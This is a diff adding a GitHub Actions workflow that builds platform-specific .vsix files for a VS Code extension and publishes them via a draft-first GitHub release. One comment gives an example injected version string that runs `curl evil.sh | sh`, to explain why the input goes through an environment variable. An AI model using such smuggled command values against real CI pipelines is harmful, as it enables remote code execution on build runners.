@@ -1,0 +1,260 @@
+# Builds the Workflow Insight Explorer VS Code extension for each supported
+# platform/arch, creates a DRAFT GitHub Release, attaches all 4 platform
+# .vsix files to it, then publishes the release as the final step. This
+# extension is not published to npm (it's "private": true) or, during
+# preview, to the VS Code Marketplace — see
+# packages/aws-durable-execution-sdk-js-insight-vscode/README.md.
+# Testers/customers install it by downloading the .vsix matching their
+# platform from the release and side-loading it with
+# `code --install-extension`.
+#
+# Multiple platform-specific .vsix files are required because the bundled
+# local (on-device) LLM provider depends on node-llama-cpp, which ships
+# native prebuilt binaries per OS/arch. `vsce package --target <target>` must
+# run on a matching host so npm resolves that target's binary via
+# optionalDependencies — there is no cross-compiling this from one runner.
+#
+# --- Why workflow_dispatch instead of `on: release: published` ---
+# This repo has GitHub's immutable-releases protection enabled: once a
+# release is published, its assets can no longer be added, changed, or
+# removed (HTTP 422 "Cannot upload assets to an immutable release"). A
+# `release: published` trigger fires only AFTER the release is already
+# published — too late to attach anything.
+# GitHub's own docs recommend the fix: create the release as a DRAFT, attach
+# every asset while it's still a draft, then publish it last. But `release`
+# events are explicitly NOT sent for draft-related activity (per GitHub's
+# events-that-trigger-workflows docs: "Workflows are not triggered for the
+# created, edited, or deleted activity types for draft releases"), so no
+# `release`-event trigger can drive this. workflow_dispatch (a manual/scripted
+# trigger, run BEFORE any release or tag exists) is the only way to run this
+# sequence in the right order.
+
+name: vscode extension release
+
+permissions:
+  contents: read
+
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Version to release (must exactly match packages/aws-durable-execution-sdk-js-insight-vscode/package.json's version on the ref you're running this from). The release tag will be workflow-insight-vscode-v<version>."
+        required: true
+        type: string
+
+jobs:
+  check-version:
+    runs-on: ubuntu-latest
+    outputs:
+      vsix_version: ${{ steps.check.outputs.vsix_version }}
+      tag_name: ${{ steps.check.outputs.tag_name }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - id: check
+        env:
+          # Untrusted workflow_dispatch input — must go through an
+          # intermediate environment variable, not be interpolated directly
+          # into the run: script, per GitHub's script-injection guidance
+          # (https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable).
+          # A malicious version value like `0.1.0"; curl evil.sh | sh; #`
+          # would otherwise be spliced into the generated shell script
+          # before bash ever parses it — the "$INPUT_VERSION" quoting below
+          # does NOT protect against this, since the substitution happens
+          # at the YAML-templating stage, not inside the shell.
+          INPUT_VERSION: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          PKG_VERSION=$(node -p "require('./packages/aws-durable-execution-sdk-js-insight-vscode/package.json').version")
+          if [[ "$INPUT_VERSION" != "$PKG_VERSION" ]]; then
+            echo "Input version '$INPUT_VERSION' does not match package.json version '$PKG_VERSION' on this ref. Aborting before creating any release."
+            exit 1
+          fi
+          echo "vsix_version=$PKG_VERSION" >> "$GITHUB_OUTPUT"
+          echo "tag_name=workflow-insight-vscode-v${PKG_VERSION}" >> "$GITHUB_OUTPUT"
+
+  create-draft-release:
+    needs: [check-version]
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write # required to create the draft release
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - name: Create draft release (or reuse an existing one for this tag)
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.check-version.outputs.tag_name }}
+          REPO: ${{ github.repository }}
+          VSIX_VERSION: ${{ needs.check-version.outputs.vsix_version }}
+        run: |
+          set -euo pipefail
+          if gh release view "$TAG" --repo "$REPO" >/dev/null 2>&1; then
+            IS_DRAFT=$(gh release view "$TAG" --repo "$REPO" --json isDraft --jq '.isDraft')
+            if [[ "$IS_DRAFT" != "true" ]]; then
+              echo "Release '$TAG' already exists and is already published (not a draft) — refusing to touch it. Bump the version to release again."
+              exit 1
+            fi
+            echo "Draft release '$TAG' already exists; reusing it."
+          else
+            gh release create "$TAG" --repo "$REPO" \
+              --title "Workflow Insight Explorer ${VSIX_VERSION} (Preview)" \
+              --notes "Preview build — multi-platform .vsix release. Includes darwin-arm64, win32-x64, win32-arm64, and linux-x64 builds with on-device LLM support." \
+              --draft
+          fi
+
+  build-and-attach:
+    needs: [check-version, create-draft-release]
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # node-llama-cpp ships native prebuilt binaries per OS/arch (resolved
+          # by npm via optionalDependencies at install time based on the HOST
+          # platform) — so each target's .vsix must be built on a runner that
+          # actually matches that target; there is no cross-compiling this.
+          - target: darwin-arm64
+            os: macos-14
+          - target: win32-x64
+            os: windows-latest
+          - target: win32-arm64
+            os: windows-11-arm
+          - target: linux-x64
+            os: ubuntu-latest
+    runs-on: ${{ matrix.os }}
+    permissions:
+      contents: write # required to upload a release asset
+    defaults:
+      run:
+        working-directory: packages/aws-durable-execution-sdk-js-insight-vscode
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
+        with:
+          node-version: 24
+      - name: Install root dependencies
+        # --ignore-scripts avoids the repo-root "prepare" script (husky
+        # install), which can fail on a fresh CI checkout (observed:
+        # "sh: husky: command not found", exit 127) — likely a PATH-timing
+        # issue with npm's lifecycle-script execution, not anything this
+        # job needs. Git hooks are irrelevant in CI, and nothing below
+        # (typecheck, test, or the isolated packaging step) depends on any
+        # other root-level lifecycle script.
+        run: npm ci --ignore-scripts
+      - name: Install webview-ui dependencies
+        # webview-ui is a nested package outside the root workspaces glob
+        # (packages/*), so it needs its own explicit install.
+        working-directory: packages/aws-durable-execution-sdk-js-insight-vscode/webview-ui
+        run: npm ci
+      - run: npm run typecheck
+      - run: npm run test
+      - name: Package (${{ matrix.target }}) in an isolated (non-workspace) copy
+        # `vsce package` cannot run correctly from inside this npm workspace:
+        # - npm hoists node-llama-cpp's resolved per-platform native binary
+        #   (@node-llama-cpp/<platform>) to the repo-root node_modules/, but
+        #   vsce/VS Code require a self-contained package directory.
+        # - vsce's dependency walk also picks up sibling workspace packages
+        #   via `../` and fails outright (`invalid relative path`).
+        # Isolating a copy of just this package (with its own standalone
+        # `npm install --no-workspaces`) outside the workspace tree avoids
+        # both problems — this is the standard workaround for vsce +
+        # npm/yarn workspaces (see microsoft/vscode-vsce#471, #581).
+        shell: bash
+        run: |
+          set -euo pipefail
+          ISOLATED="$RUNNER_TEMP/insight-vscode-pkg"
+          rm -rf "$ISOLATED"
+          mkdir -p "$ISOLATED"
+          # Portable copy (avoids relying on rsync, which isn't preinstalled
+          # on Windows runners): tar streamed through a pipe, excluding
+          # directories we don't want carried into the isolated copy.
+          tar --exclude='./node_modules' --exclude='./vsix' --exclude='./dist' \
+            --exclude='./webview-ui/node_modules' --exclude='./webview-ui/dist' \
+            -cf - . | tar -xf - -C "$ISOLATED"
+          cd "$ISOLATED"
+          # Run node-llama-cpp's postinstall (i.e. don't pass --ignore-scripts)
+          # so binary resolution happens deterministically here, matching
+          # node-llama-cpp's own documented recommendation ("allow scripts...
+          # to ensure resolving the binaries happens during npm install,
+          # instead of on the first time of calling getLlama"). As of the npm
+          # version pinned above, install scripts still run by default (the
+          # package.json "allowScripts" allow-list is advisory-only in this
+          # npm release per `npm help approve-scripts`; a future npm release
+          # is expected to enforce it, at which point this step may need an
+          # explicit allow-list entry for node-llama-cpp).
+          #
+          # The getLlama() smoke test below is the real guardrail: it fails
+          # the build if this platform's native binary didn't resolve,
+          # instead of silently shipping a .vsix that would only fail for an
+          # end user on first use of the local (on-device) LLM provider.
+          npm install --no-workspaces
+          test -d node_modules/node-llama-cpp || { echo "node-llama-cpp did not install"; exit 1; }
+          node --input-type=module -e "
+            import('node-llama-cpp').then(({getLlama}) => getLlama())
+              .then(() => console.log('getLlama() resolved OK'))
+              .catch(e => { console.error('getLlama() failed:', e.message); process.exit(1); });
+          "
+          (cd webview-ui && npm ci)
+          npm run package:target
+          mkdir -p "$GITHUB_WORKSPACE/packages/aws-durable-execution-sdk-js-insight-vscode/vsix"
+          cp vsix/*.vsix "$GITHUB_WORKSPACE/packages/aws-durable-execution-sdk-js-insight-vscode/vsix/"
+        env:
+          VSCE_TARGET: ${{ matrix.target }}
+      - name: Upload .vsix to draft release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.check-version.outputs.tag_name }}
+          REPO: ${{ github.repository }}
+        shell: bash
+        run: |
+          gh release upload "$TAG" vsix/*.vsix --clobber --repo "$REPO"
+
+  verify-and-publish:
+    needs: [check-version, build-and-attach]
+    # !cancelled() (not the implicit if: success()) is required here: with
+    # strategy.fail-fast: false, a single matrix leg failing still marks the
+    # whole build-and-attach job as failed overall, and a downstream job that
+    # only `needs` a failed job is skipped by default — meaning this
+    # verification would never run in exactly the scenario it exists to
+    # catch (a partial release with some platforms missing).
+    #
+    # needs.check-version.result == 'success' is also required: without it,
+    # a failure in check-version itself (e.g. version mismatch) skips
+    # create-draft-release and build-and-attach, but !cancelled() alone
+    # would still let this job run with empty TAG/VER outputs — turning one
+    # clean, expected failure (bad version input) into a second, confusing
+    # "release not found" error instead of a clean skip.
+    if: ${{ !cancelled() && needs.check-version.result == 'success' }}
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write # required to publish the release
+    steps:
+      - name: Confirm all 4 platform .vsix files are attached, then publish
+        # Only publish once every expected asset is present — this is what
+        # keeps the draft-first design safe: nothing becomes immutable until
+        # this check passes. If anything is missing, the release is left as
+        # a draft (not immutable, not visible to normal users) so the run
+        # can be fixed and re-triggered without any cleanup.
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.check-version.outputs.tag_name }}
+          REPO: ${{ github.repository }}
+          VER: ${{ needs.check-version.outputs.vsix_version }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          ASSETS=$(gh release view "$TAG" --repo "$REPO" --json assets --jq '.assets[].name')
+          MISSING=0
+          for target in darwin-arm64 win32-x64 win32-arm64 linux-x64; do
+            EXPECTED="aws-durable-execution-sdk-js-insight-vscode-${VER}-${target}.vsix"
+            if echo "$ASSETS" | grep -qxF "$EXPECTED"; then
+              echo "OK: $EXPECTED present"
+            else
+              echo "MISSING: $EXPECTED"
+              MISSING=1
+            fi
+          done
+          if [ "$MISSING" -ne 0 ]; then
+            echo "One or more platform .vsix files are missing from draft release '$TAG'. Leaving it as a draft — re-run this workflow after fixing the failing leg(s)."
+            exit 1
+          fi
+          echo "All 4 platform .vsix files present. Publishing release '$TAG'."
+          gh release edit "$TAG" --repo "$REPO" --draft=false
